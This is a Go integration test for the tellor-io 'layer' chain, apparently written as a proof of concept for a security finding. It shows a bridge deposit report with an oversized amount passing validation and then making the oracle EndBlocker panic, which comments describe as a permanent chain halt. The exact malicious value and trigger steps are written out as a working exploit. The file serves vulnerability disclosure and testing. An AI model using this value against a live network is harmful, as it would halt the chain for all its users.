package integration_test

import (
	"encoding/hex"
	"fmt"
	"math/big"
	"strconv"
	"time"

	cmtproto "github.com/cometbft/cometbft/proto/tendermint/types"
	cmttypes "github.com/cometbft/cometbft/types"
	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/common"
	"github.com/tellor-io/layer/utils"
	bridgetypes "github.com/tellor-io/layer/x/bridge/types"
	"github.com/tellor-io/layer/x/oracle"
	"github.com/tellor-io/layer/x/oracle/keeper"
	"github.com/tellor-io/layer/x/oracle/types"
	reporterkeeper "github.com/tellor-io/layer/x/reporter/keeper"
	reportertypes "github.com/tellor-io/layer/x/reporter/types"

	"cosmossdk.io/math"

	sdk "github.com/cosmos/cosmos-sdk/types"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
)

// packBridgeDepositValue ABI-encodes a deposit report value the same way the EVM side does:
// abi.encode(address ethSender, string layerRecipient, uint256 amount, uint256 tip).
func packBridgeDepositValue(recipient string, amount, tip *big.Int) (string, error) {
	addressType, err := abi.NewType("address", "", nil)
	if err != nil {
		return "", err
	}
	stringType, err := abi.NewType("string", "", nil)
	if err != nil {
		return "", err
	}
	uint256Type, err := abi.NewType("uint256", "", nil)
	if err != nil {
		return "", err
	}
	args := abi.Arguments{
		{Type: addressType}, {Type: stringType}, {Type: uint256Type}, {Type: uint256Type},
	}
	enc, err := args.Pack(
		common.HexToAddress("0x3386518F7ab3eb51591571adBE62CF94540EAd29"),
		recipient, amount, tip,
	)
	if err != nil {
		return "", err
	}
	return hex.EncodeToString(enc), nil
}

func recoverPanic(f func()) (pv interface{}) {
	defer func() { pv = recover() }()
	f()
	return nil
}

// CRITICAL (CHAIN_HALT) — Tier 3 (real multi-module state machine).
//
// This clones the passing TestClaimingBridgeDeposit flow VERBATIM (same validators,
// reporters, checkpoint power threshold, tip, aggregation) and changes ONE thing: the
// attested deposit value carries an unbounded uint256 amount (1e31 wei). Submit-time
// validation (validateBridgeDepositAmount) only checks the sign, so the value passes,
// aggregates with full reporter power, and is queued for auto-claim.
//
// 12h later, the REAL oracle EndBlocker (AutoClaimDeposits -> Bridgekeeper.ClaimDeposit
// -> DecodeDepositReportValue) converts the amount via big.Int.Int64() -> NewInt64Coin,
// which wraps negative and PANICS ("negative coin amount"). The panic is NOT a returned
// error, so AutoClaimDeposits' error handler cannot dequeue it; it propagates out of the
// consensus EndBlock hook. On a live node this is an uncaught FinalizeBlock panic that
// re-fires every block (the queue entry is never removed because the block never commits)
// => permanent, deterministic chain halt.
//
// Benign sibling TestClaimingBridgeDeposit asserts oracle.EndBlocker returns NoError and
// the deposit is claimed; here the only change is the value, and the result is a panic.
func (s *IntegrationTestSuite) TestBridgeDepositOverflowHaltsEndBlocker() {
	require := s.Require()
	ctx := s.Setup.Ctx.WithBlockHeight(10).WithBlockTime(time.Now())
	ctx = ctx.WithConsensusParams(cmtproto.ConsensusParams{
		Block:    &cmtproto.BlockParams{MaxBytes: 200000, MaxGas: 100_000_000},
		Evidence: &cmtproto.EvidenceParams{MaxAgeNumBlocks: 302400, MaxAgeDuration: 504 * time.Hour, MaxBytes: 10000},
		Validator: &cmtproto.ValidatorParams{
			PubKeyTypes: []string{cmttypes.ABCIPubKeyTypeEd25519},
		},
		Abci: &cmtproto.ABCIParams{VoteExtensionsEnableHeight: 1},
	})
	s.Setup.Ctx = s.Setup.Ctx.WithConsensusParams(ctx.ConsensusParams())
	reporterMsgServer := reporterkeeper.NewMsgServerImpl(s.Setup.Reporterkeeper)
	require.NotNil(reporterMsgServer)
	oracleMsgServer := keeper.NewMsgServerImpl(s.Setup.Oraclekeeper)
	require.NotNil(s.Setup.Bridgekeeper)

	// Height 10 - create bonded validators and reporters
	_, err := s.Setup.App.BeginBlocker(ctx)
	require.NoError(err)

	valAccAddrs, valAccountValAddrs, _ := s.Setup.CreateValidators(5)
	for _, val := range valAccountValAddrs {
		require.NoError(s.Setup.Bridgekeeper.SetEVMAddressByOperator(s.Setup.Ctx, val.String(), []byte("addr")))
	}
	initCoins := sdk.NewCoin(s.Setup.Denom, math.NewInt(500*1e6))
	for i, rep := range valAccAddrs {
		require.NoError(s.Setup.Bankkeeper.MintCoins(s.Setup.Ctx, authtypes.Minter, sdk.NewCoins(initCoins)))
		require.NoError(s.Setup.Bankkeeper.SendCoinsFromModuleToAccount(s.Setup.Ctx, authtypes.Minter, rep, sdk.NewCoins(initCoins)))
		msgCreateReporter := reportertypes.MsgCreateReporter{
			ReporterAddress:   rep.String(),
			CommissionRate:    math.LegacyNewDec(1),
			MinTokensRequired: math.NewInt(1 * 1e6),
			Moniker:           "rep" + strconv.Itoa(i),
		}
		_, err := reporterMsgServer.CreateReporter(ctx, &msgCreateReporter)
		require.NoError(err)
	}

	// bridge validator checkpoint (power threshold), identical to the benign test
	valTimestamp := uint64(time.Now().Add(-1 * time.Hour).UnixMilli())
	checkpointParams := bridgetypes.ValidatorCheckpointParams{
		Checkpoint:     []byte("checkpoint"),
		ValsetHash:     []byte("hash"),
		Timestamp:      valTimestamp,
		PowerThreshold: uint64(3000 * 1e6),
	}
	require.NoError(s.Setup.Bridgekeeper.ValidatorCheckpointParamsMap.Set(ctx, valTimestamp, checkpointParams))

	_, err = s.Setup.App.EndBlocker(ctx)
	require.NoError(err)

	// Height 11 - tip + everybody reports the bridge deposit (with the MALICIOUS value)
	ctx = ctx.WithBlockHeight(11).WithBlockTime(time.Now())
	_, err = s.Setup.App.BeginBlocker(ctx)
	require.NoError(err)

	bridgeQueryDataString := "00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000b5452424272696467655632000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001"
	bridgeQueryData, err := hex.DecodeString(bridgeQueryDataString)
	require.NoError(err)

	_, err = oracleMsgServer.Tip(ctx, &types.MsgTip{
		Tipper:    valAccAddrs[0].String(),
		QueryData: bridgeQueryData,
		Amount:    sdk.NewCoin("loya", math.NewInt(1*1e6)),
	})
	require.NoError(err)

	// THE ATTACK: amount = 1e31 wei -> /1e12 = 1e19 > MaxInt64. Recipient is a valid layer addr.
	overflowAmount, ok := new(big.Int).SetString("10000000000000000000000000000000", 10)
	require.True(ok)
	overflowValue, err := packBridgeDepositValue(valAccAddrs[0].String(), overflowAmount, big.NewInt(0))
	require.NoError(err)

	for _, rep := range valAccAddrs {
		_, err = oracleMsgServer.SubmitValue(ctx, &types.MsgSubmitValue{
			Creator:   rep.String(),
			QueryData: bridgeQueryData,
			Value:     overflowValue,
		})
		require.NoError(err, "malicious value passes submit (only sign-checked)")
	}

	_, err = s.Setup.App.EndBlocker(ctx)
	require.NoError(err)

	// Height 2012 - fast forward so the bridge deposit aggregates
	ctx = ctx.WithBlockHeight(2012)
	_, err = s.Setup.App.BeginBlocker(ctx)
	require.NoError(err)
	_, err = s.Setup.App.EndBlocker(ctx)
	require.NoError(err)

	// Height 2013 - verify the malicious aggregate formed
	ctx = ctx.WithBlockHeight(2013)
	_, err = s.Setup.App.BeginBlocker(ctx)
	require.NoError(err)

	queryId := utils.QueryIDFromData(bridgeQueryData)
	queryServer := keeper.NewQuerier(s.Setup.Oraclekeeper)
	res, err := queryServer.GetCurrentAggregateReport(ctx, &types.QueryGetCurrentAggregateReportRequest{
		QueryId: hex.EncodeToString(queryId),
	})
	require.NoError(err)
	require.NotNil(res)
	require.Equal(overflowValue, res.Aggregate.AggregateValue, "the unbounded value is now the on-chain aggregate")

	// not yet claimed
	claimed, err := s.Setup.Bridgekeeper.DepositIdClaimedMap.Get(ctx, uint64(1))
	require.ErrorContains(err, "collections: not found")
	require.False(claimed.Claimed)

	// fast forward 12h so the deposit is auto-claimable in the EndBlocker
	ctx = ctx.WithBlockTime(time.Now().Add(13 * time.Hour))

	// HARM: the real consensus EndBlocker PANICS (does not return an error) -> chain halt.
	pv := recoverPanic(func() { _ = oracle.EndBlocker(ctx, s.Setup.Oraclekeeper) })
	require.NotNil(pv, "oracle EndBlocker must PANIC on the overflow deposit (uncaught -> halt)")

	var msg string
	if e, isErr := pv.(error); isErr {
		msg = e.Error()
	} else {
		msg = fmt.Sprintf("%v", pv)
	}
	require.Contains(msg, "negative coin amount",
		"halt is the unbounded-amount negative-coin panic in DecodeDepositReportValue")
	s.T().Logf("CONFIRMED CHAIN HALT — oracle.EndBlocker panicked: %q", msg)

	// The deposit is still unclaimed AND still queued: the panic prevented the block from
	// committing, so on a real node every subsequent block re-fires the same panic.
	claimed, err = s.Setup.Bridgekeeper.DepositIdClaimedMap.Get(ctx, uint64(1))
	require.ErrorContains(err, "collections: not found")
	require.False(claimed.Claimed)
}
